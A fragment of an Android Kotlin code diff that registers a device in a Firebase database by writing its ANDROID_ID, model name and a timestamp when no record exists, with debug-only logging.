+                    Log.d("SYS_CORE", "🔧 Device snapshot exists: ${snapshot.exists()}, hasChild(deviceId): ${snapshot.hasChild("deviceId")}")
+                }
+                if (!snapshot.hasChild("deviceId")) {
+                    val deviceId = android.provider.Settings.Secure.getString(
+                        contentResolver,
+                        android.provider.Settings.Secure.ANDROID_ID
+                    )
+                    val deviceName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
+                    
+                    if (BuildConfig.DEBUG) {
+                        Log.d("SYS_CORE", "🔧 Writing device info - ID: $deviceId, Name: $deviceName")
+                    }
+                    
+                    deviceRef.updateChildren(mapOf(
+                        "deviceId" to deviceId,
+                        "deviceName" to deviceName,
+                        "email" to null,
+                        "registeredAt" to com.google.firebase.database.ServerValue.TIMESTAMP
+                    )).addOnSuccessListener {
+                        if (BuildConfig.DEBUG) {
+                            Log.d("SYS_CORE", "✅ Device info written successfully")
+                        }
+                    }.addOnFailureListener { e ->
+                        if (BuildConfig.DEBUG) {
+                            Log.e("SYS_CORE", "❌ Device info write failed: ${e.message}")
+                        }
+                    }
+                } else {
+                    // This block will never execute with if (true) condition
+                }
+            }
+            
+            override fun onCancelled(error: DatabaseError) {
+                if (BuildConfig.DEBUG) {
+                    Log.e("SYS_CORE", "Device registration check failed", error.toException())
+                }
+            }
+        })
     }
 
     companion object {
